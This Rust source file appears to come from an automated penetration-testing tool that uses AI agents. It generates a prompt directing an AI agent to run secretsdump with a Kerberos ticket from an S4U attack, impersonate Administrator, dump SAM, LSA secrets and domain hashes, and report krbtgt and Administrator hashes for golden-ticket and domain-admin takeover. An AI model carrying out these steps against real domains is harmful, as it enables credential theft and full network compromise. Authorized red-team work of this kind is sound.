//! Kerberos ticket-based secretsdump prompt branch.

use std::fmt::Write;

use crate::prompt::state_context::format_state_context;
use crate::prompt::StateSnapshot;

use super::Params;

/// Try to generate a Kerberos ticket-based secretsdump prompt.
/// Returns `Some` if the conditions match, `None` otherwise.
pub(super) fn try_generate(
    task_id: &str,
    p: &Params<'_>,
    state: Option<&StateSnapshot>,
) -> Option<anyhow::Result<String>> {
    if !(p.ticket_path.is_some() && p.no_pass && p.techniques.iter().any(|t| t == "secretsdump")) {
        return None;
    }

    let target = p.targets.first().copied().unwrap_or("");
    let user = if p.username.is_empty() {
        "Administrator"
    } else {
        p.username
    };
    let ticket = p.ticket_path.unwrap_or("");
    let dc_ip = p.dc_ip;
    let domain = p.domain;
    let mut prompt = format!(
        "**KERBEROS TICKET-BASED SECRETSDUMP**\n\n\
         Target: {target}\n\
         Domain: {domain}\n\
         Username: {user}\n\
         Ticket Path: {ticket}\n\
         DC IP: {dc_ip_display}\n\
         Task ID: {task_id}\n\n\
         **CRITICAL: You have a Kerberos ticket from S4U attack!**\n\
         This ticket allows you to impersonate Administrator to the target.\n\n\
         **EXECUTE secretsdump with Kerberos ticket:**\n\
         secretsdump(\n\
             target='{target}',\n\
             username='{user}',\n\
             no_pass=True,\n\
             ticket_path='{ticket}'",
        dc_ip_display = if dc_ip.is_empty() { "N/A" } else { dc_ip },
    );
    if !dc_ip.is_empty() {
        write!(prompt, ",\n    dc_ip='{dc_ip}'").unwrap();
    }
    prompt.push_str(
        "\n)\n\n\
         **IMPORTANT:**\n\
         - The ticket_path sets KRB5CCNAME for Kerberos auth\n\
         - no_pass=True tells secretsdump to use -k -no-pass\n\
         - This will dump SAM, LSA secrets, and domain hashes if on a DC\n\n\
         If secretsdump succeeds, look for:\n\
         - krbtgt hash -> GOLDEN TICKET capability\n\
         - Administrator hash -> DOMAIN ADMIN ACHIEVED\n\n\
         Report any hashes found in JSON format:\n\
         ```json\n\
         {\"hash\": {\"username\": \"Administrator\", \"hash_value\": \"...\", \
          \"hash_type\": \"NTLM\", \"domain\": \"...\"}}\n\
         ```",
    );
    if let Some(s) = state {
        prompt.push_str(&format_state_context(s, "credential_access", Some(target)));
    }
    Some(Ok(prompt))
}
